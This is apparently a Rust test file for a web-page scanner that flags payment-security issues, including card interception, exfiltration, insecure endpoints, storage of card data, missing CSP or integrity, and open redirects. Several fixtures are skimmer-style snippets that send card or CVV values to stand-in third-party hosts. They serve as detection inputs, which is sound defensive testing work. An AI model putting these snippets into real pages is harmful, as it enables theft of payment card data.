use crate::payment_handler_audit::*;

#[test]
fn no_payment_handler_no_issues() {
    assert!(analyze_payment_handler("<html><body>hello</body></html>").is_empty());
}

#[test]
fn detects_api_payment_handler() {
    let body = r#"<script>if (window.PaymentHandler) {}</script>"#;
    let issues = analyze_payment_handler(body);
    assert!(issues.contains(&PaymentHandlerIssue::ApiDetected));
}

#[test]
fn detects_api_payment_manager() {
    let body = r#"<script>const pm = reg.paymentManager;</script>"#;
    let issues = analyze_payment_handler(body);
    assert!(issues.contains(&PaymentHandlerIssue::ApiDetected));
}

#[test]
fn detects_custom_handler() {
    let body = r#"<script>const pm = reg.paymentManager;</script>"#;
    let issues = analyze_payment_handler(body);
    assert!(issues.contains(&PaymentHandlerIssue::CustomHandler));
}

#[test]
fn detects_data_interception() {
    let body = r#"<script>
        self.addEventListener("paymentrequest", (e) => {
            fetch("/log", {body: JSON.stringify(e.methodData)});
        });
    </script>"#;
    let issues = analyze_payment_handler(body);
    assert!(issues.contains(&PaymentHandlerIssue::DataInterception));
}

#[test]
fn no_interception_without_fetch() {
    let body = r#"<script>
        self.addEventListener("paymentrequest", (e) => {
            e.respondWith(new PaymentResponse());
        });
    </script>"#;
    let issues = analyze_payment_handler(body);
    assert!(!issues.contains(&PaymentHandlerIssue::DataInterception));
}

#[test]
fn detects_instrument_enumeration() {
    let body = r#"<script>
        const pm = reg.paymentManager;
        const all = await pm.instruments.getAll();
    </script>"#;
    let issues = analyze_payment_handler(body);
    assert!(issues.contains(&PaymentHandlerIssue::InstrumentEnumeration));
}

#[test]
fn no_enumeration_without_getall() {
    let body = r#"<script>
        const pm = reg.paymentManager;
        await pm.instruments.set("card", {name: "Visa"});
    </script>"#;
    let issues = analyze_payment_handler(body);
    assert!(!issues.contains(&PaymentHandlerIssue::InstrumentEnumeration));
}

#[test]
fn detects_no_origin_validation() {
    let body = r#"<script>
        self.addEventListener("paymentrequest", (e) => {
            const pm = reg.paymentManager;
            e.respondWith(handlePayment(e));
        });
    </script>"#;
    let issues = analyze_payment_handler(body);
    assert!(issues.contains(&PaymentHandlerIssue::NoOriginValidation));
}

#[test]
fn no_origin_issue_with_check() {
    let body = r#"<script>
        self.addEventListener("paymentrequest", (e) => {
            const pm = reg.paymentManager;
            if (e.topOrigin === "https://shop.example") { }
        });
    </script>"#;
    let issues = analyze_payment_handler(body);
    assert!(!issues.contains(&PaymentHandlerIssue::NoOriginValidation));
}

#[test]
fn severity_interception_highest() {
    assert_eq!(
        payment_handler_severity(&PaymentHandlerIssue::DataInterception),
        8.0
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(
        payment_handler_severity(&PaymentHandlerIssue::ApiDetected),
        3.0
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        PaymentHandlerIssue::ApiDetected,
        PaymentHandlerIssue::CustomHandler,
    ];
    let mut seq = 0;
    let ops = payment_handler_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(PaymentHandlerIssue::ApiDetected.to_string(), "api_detected");
    assert_eq!(
        PaymentHandlerIssue::CustomHandler.to_string(),
        "custom_handler"
    );
    assert_eq!(
        PaymentHandlerIssue::DataInterception.to_string(),
        "data_interception"
    );
    assert_eq!(
        PaymentHandlerIssue::InstrumentEnumeration.to_string(),
        "instrument_enumeration"
    );
    assert_eq!(
        PaymentHandlerIssue::NoOriginValidation.to_string(),
        "no_origin_validation"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_payment_handler("").is_empty());
}

// PaymentHandlerSecurityIssue Tests

#[test]
fn security_empty_body_no_issues() {
    assert!(analyze_payment_handler_security("").is_empty());
}

#[test]
fn security_no_payment_no_issues() {
    let body = "<html><body><h1>Welcome</h1></body></html>";
    assert!(analyze_payment_handler_security(body).is_empty());
}

#[test]
fn detects_payment_data_exfiltration_analytics() {
    let body = r#"
        <script>
        const payment = {card: '4111', cvv: '123'};
        fetch('https://analytics.example.com/track', {
            method: 'POST',
            body: JSON.stringify(payment)
        });
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentDataExfiltration));
}

#[test]
fn detects_payment_data_exfiltration_tracker() {
    let body = r#"
        <script>
        const cardData = document.getElementById('card').value;
        const xhr = new XMLHttpRequest();
        xhr.open('POST', 'https://tracker.example.com/log');
        xhr.send(cardData);
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentDataExfiltration));
}

#[test]
fn detects_payment_data_exfiltration_beacon() {
    let body = r#"
        <script>
        const cvv = document.getElementById('cvv').value;
        navigator.sendBeacon('https://beacon.example.com/track', cvv);
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentDataExfiltration));
}

#[test]
fn no_exfiltration_without_third_party() {
    let body = r#"
        <script>
        const payment = {card: '4111'};
        fetch('/api/payment', {method: 'POST', body: JSON.stringify(payment)});
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(!issues.contains(&PaymentHandlerSecurityIssue::PaymentDataExfiltration));
}

#[test]
fn detects_insecure_payment_endpoint_action() {
    let body = r#"
        <form action="http://example.com/payment" method="POST">
            <input name="card" />
        </form>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::InsecurePaymentEndpoint));
}

#[test]
fn detects_insecure_payment_endpoint_fetch() {
    let body = r#"
        <script>
        fetch('http://checkout.example.com/api/pay', {
            method: 'POST',
            body: paymentData
        });
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::InsecurePaymentEndpoint));
}

#[test]
fn detects_insecure_payment_endpoint_ajax() {
    let body = r#"
        <script>
        $.ajax({
            url: 'http://example.com/checkout',
            method: 'POST',
            data: checkoutData
        });
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::InsecurePaymentEndpoint));
}

#[test]
fn no_insecure_endpoint_with_https() {
    let body = r#"
        <form action="https://example.com/payment" method="POST">
            <input name="card" />
        </form>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(!issues.contains(&PaymentHandlerSecurityIssue::InsecurePaymentEndpoint));
}

#[test]
fn detects_payment_without_csp() {
    let body = r#"
        <html>
        <head><title>Payment</title></head>
        <body>
            <form action="/payment" method="POST">
                <input name="card" />
            </form>
        </body>
        </html>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutCSP));
}

#[test]
fn detects_checkout_without_csp() {
    let body = r#"
        <html>
        <head><title>Checkout</title></head>
        <body>
            <div id="checkout">
                <input name="card" />
            </div>
        </body>
        </html>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutCSP));
}

#[test]
fn detects_billing_without_csp() {
    let body = r#"
        <html>
        <head><title>Billing</title></head>
        <body>
            <form action="/billing" method="POST">
                <input name="card" />
            </form>
        </body>
        </html>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutCSP));
}

#[test]
fn no_csp_issue_when_present() {
    let body = r#"
        <html>
        <head>
            <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
            <title>Payment</title>
        </head>
        <body>
            <form action="/payment" method="POST">
                <input name="card" />
            </form>
        </body>
        </html>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(!issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutCSP));
}

#[test]
fn detects_card_in_localstorage() {
    let body = r#"
        <script>
        const card = document.getElementById('card').value;
        localStorage.setItem('cardNumber', card);
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::CardDataInLocalStorage));
}

#[test]
fn detects_cvv_in_localstorage() {
    let body = r#"
        <script>
        const cvv = document.getElementById('cvv').value;
        localStorage.setItem('cvv', cvv);
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::CardDataInLocalStorage));
}

#[test]
fn detects_card_in_sessionstorage() {
    let body = r#"
        <script>
        const ccv = document.getElementById('ccv').value;
        sessionStorage.setItem('ccv', ccv);
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::CardDataInLocalStorage));
}

#[test]
fn no_storage_issue_without_card_data() {
    let body = r#"
        <script>
        const username = document.getElementById('username').value;
        localStorage.setItem('user', username);
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(!issues.contains(&PaymentHandlerSecurityIssue::CardDataInLocalStorage));
}

#[test]
fn detects_payment_in_iframe() {
    let body = r#"
        <iframe src="https://payment.example.com/checkout">
        </iframe>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentInIframe));
}

#[test]
fn detects_checkout_in_iframe() {
    let body = r#"
        <iframe src="https://example.com/checkout" width="500" height="400">
        </iframe>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentInIframe));
}

#[test]
fn detects_billing_in_iframe() {
    let body = r#"
        <iframe src="https://billing.example.com/form">
        </iframe>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentInIframe));
}

#[test]
fn no_iframe_issue_with_sandbox() {
    let body = r#"
        <iframe src="https://payment.example.com/checkout" sandbox="allow-scripts">
        </iframe>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(!issues.contains(&PaymentHandlerSecurityIssue::PaymentInIframe));
}

#[test]
fn detects_payment_script_without_integrity() {
    let body = r#"
        <script src="https://js.stripe.com/v3/"></script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutIntegrity));
}

#[test]
fn detects_paypal_script_without_integrity() {
    let body = r#"
        <script src="https://www.paypal.com/sdk/js?client-id=test"></script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutIntegrity));
}

#[test]
fn detects_square_script_without_integrity() {
    let body = r#"
        <script src="https://js.squareup.com/v2/paymentform"></script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutIntegrity));
}

#[test]
fn no_integrity_issue_when_present() {
    let body = r#"
        <script src="https://js.stripe.com/v3/"
                integrity="sha384-abc123"
                crossorigin="anonymous"></script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(!issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutIntegrity));
}

#[test]
fn detects_autocomplete_on_card_field() {
    let body = r#"
        <form>
            <input type="text" name="card" id="cardNumber" />
        </form>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentFormAutoComplete));
}

#[test]
fn detects_autocomplete_on_cvv_field() {
    let body = r#"
        <form>
            <input type="text" name="cvv" />
        </form>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentFormAutoComplete));
}

#[test]
fn detects_autocomplete_on_ccv_field() {
    let body = r#"
        <input name="ccv" />
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentFormAutoComplete));
}

#[test]
fn no_autocomplete_issue_when_disabled() {
    let body = r#"
        <form>
            <input type="text" name="card" autocomplete="off" />
        </form>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(!issues.contains(&PaymentHandlerSecurityIssue::PaymentFormAutoComplete));
}

#[test]
fn detects_payment_cookie_without_secure() {
    let body = r#"
        <script>
        document.cookie = "paymentToken=abc123; path=/";
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutSSL));
}

#[test]
fn detects_session_cookie_without_secure() {
    let body = r#"
        <script>
        document.cookie = "sessionToken=xyz789; path=/";
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutSSL));
}

#[test]
fn detects_setcookie_without_secure() {
    let body = r#"
        Set-Cookie: token=abc123; Path=/; HttpOnly
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutSSL));
}

#[test]
fn no_ssl_issue_when_secure_present() {
    let body = r#"
        <script>
        document.cookie = "paymentToken=abc123; Secure; path=/";
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(!issues.contains(&PaymentHandlerSecurityIssue::PaymentWithoutSSL));
}

#[test]
fn detects_payment_redirect_with_url_param() {
    let body = r#"
        <script>
        if (paymentSuccess) {
            const url = new URLSearchParams(window.location.search).get('url');
            window.location.href = url;
        }
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentRedirectOpen));
}

#[test]
fn detects_checkout_redirect_with_redirect_param() {
    let body = r#"
        <script>
        if (checkoutComplete) {
            const redirect = new URLSearchParams(window.location.search).get('redirect');
            location.href = redirect;
        }
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentRedirectOpen));
}

#[test]
fn detects_payment_redirect_with_return_param() {
    let body = r#"
        <script>
        if (payment.status === 'success') {
            const returnUrl = new URLSearchParams(window.location.search).get('return');
            window.location = returnUrl;
        }
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentRedirectOpen));
}

#[test]
fn no_redirect_issue_without_params() {
    let body = r#"
        <script>
        if (paymentSuccess) {
            window.location.href = '/success';
        }
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(!issues.contains(&PaymentHandlerSecurityIssue::PaymentRedirectOpen));
}

#[test]
fn detects_card_data_in_url() {
    let body = r#"
        <script>
        const url = '/payment?card=4111111111111111&cvv=123';
        fetch(url);
        </script>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentDataInUrl));
}

#[test]
fn detects_amount_in_url() {
    let body = r#"
        <a href="/checkout?amount=100&payment=creditcard">Pay Now</a>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentDataInUrl));
}

#[test]
fn detects_cvv_in_url() {
    let body = r#"
        <form action="/process?cvv=123&amount=50" method="GET">
        </form>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(issues.contains(&PaymentHandlerSecurityIssue::PaymentDataInUrl));
}

#[test]
fn no_url_issue_without_sensitive_data() {
    let body = r#"
        <a href="/payment?action=checkout&step=2">Continue</a>
    "#;
    let issues = analyze_payment_handler_security(body);
    assert!(!issues.contains(&PaymentHandlerSecurityIssue::PaymentDataInUrl));
}

#[test]
fn security_severity_card_in_storage_highest() {
    assert_eq!(
        payment_handler_security_severity(&PaymentHandlerSecurityIssue::CardDataInLocalStorage),
        9.5
    );
}

#[test]
fn security_severity_exfiltration_high() {
    assert_eq!(
        payment_handler_security_severity(&PaymentHandlerSecurityIssue::PaymentDataExfiltration),
        9.0
    );
}

#[test]
fn security_severity_insecure_endpoint_high() {
    assert_eq!(
        payment_handler_security_severity(&PaymentHandlerSecurityIssue::InsecurePaymentEndpoint),
        8.5
    );
}

#[test]
fn security_severity_data_in_url_high() {
    assert_eq!(
        payment_handler_security_severity(&PaymentHandlerSecurityIssue::PaymentDataInUrl),
        8.0
    );
}

#[test]
fn security_severity_without_ssl_medium_high() {
    assert_eq!(
        payment_handler_security_severity(&PaymentHandlerSecurityIssue::PaymentWithoutSSL),
        7.5
    );
}

#[test]
fn security_severity_open_redirect_medium_high() {
    assert_eq!(
        payment_handler_security_severity(&PaymentHandlerSecurityIssue::PaymentRedirectOpen),
        7.0
    );
}

#[test]
fn security_severity_autocomplete_medium() {
    assert_eq!(
        payment_handler_security_severity(&PaymentHandlerSecurityIssue::PaymentFormAutoComplete),
        6.5
    );
}

#[test]
fn security_severity_without_integrity_medium() {
    assert_eq!(
        payment_handler_security_severity(&PaymentHandlerSecurityIssue::PaymentWithoutIntegrity),
        6.0
    );
}

#[test]
fn security_severity_in_iframe_medium_low() {
    assert_eq!(
        payment_handler_security_severity(&PaymentHandlerSecurityIssue::PaymentInIframe),
        5.5
    );
}

#[test]
fn security_severity_without_csp_low() {
    assert_eq!(
        payment_handler_security_severity(&PaymentHandlerSecurityIssue::PaymentWithoutCSP),
        5.0
    );
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        PaymentHandlerSecurityIssue::CardDataInLocalStorage,
        PaymentHandlerSecurityIssue::PaymentDataExfiltration,
    ];
    let mut seq = 0;
    let ops = payment_handler_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn security_to_operations_empty_vec() {
    let issues = vec![];
    let mut seq = 0;
    let ops = payment_handler_security_to_operations(&issues, &mut seq);
    assert!(ops.is_empty());
    assert_eq!(seq, 0);
}

#[test]
fn security_display_payment_data_exfiltration() {
    assert_eq!(
        PaymentHandlerSecurityIssue::PaymentDataExfiltration.to_string(),
        "payment_data_exfiltration"
    );
}

#[test]
fn security_display_insecure_payment_endpoint() {
    assert_eq!(
        PaymentHandlerSecurityIssue::InsecurePaymentEndpoint.to_string(),
        "insecure_payment_endpoint"
    );
}

#[test]
fn security_display_payment_without_csp() {
    assert_eq!(
        PaymentHandlerSecurityIssue::PaymentWithoutCSP.to_string(),
        "payment_without_csp"
    );
}

#[test]
fn security_display_card_data_in_localstorage() {
    assert_eq!(
        PaymentHandlerSecurityIssue::CardDataInLocalStorage.to_string(),
        "card_data_in_localstorage"
    );
}

#[test]
fn security_display_payment_in_iframe() {
    assert_eq!(
        PaymentHandlerSecurityIssue::PaymentInIframe.to_string(),
        "payment_in_iframe"
    );
}

#[test]
fn security_display_payment_without_integrity() {
    assert_eq!(
        PaymentHandlerSecurityIssue::PaymentWithoutIntegrity.to_string(),
        "payment_without_integrity"
    );
}

#[test]
fn security_display_payment_form_autocomplete() {
    assert_eq!(
        PaymentHandlerSecurityIssue::PaymentFormAutoComplete.to_string(),
        "payment_form_autocomplete"
    );
}

#[test]
fn security_display_payment_without_ssl() {
    assert_eq!(
        PaymentHandlerSecurityIssue::PaymentWithoutSSL.to_string(),
        "payment_without_ssl"
    );
}

#[test]
fn security_display_payment_redirect_open() {
    assert_eq!(
        PaymentHandlerSecurityIssue::PaymentRedirectOpen.to_string(),
        "payment_redirect_open"
    );
}

#[test]
fn security_display_payment_data_in_url() {
    assert_eq!(
        PaymentHandlerSecurityIssue::PaymentDataInUrl.to_string(),
        "payment_data_in_url"
    );
}
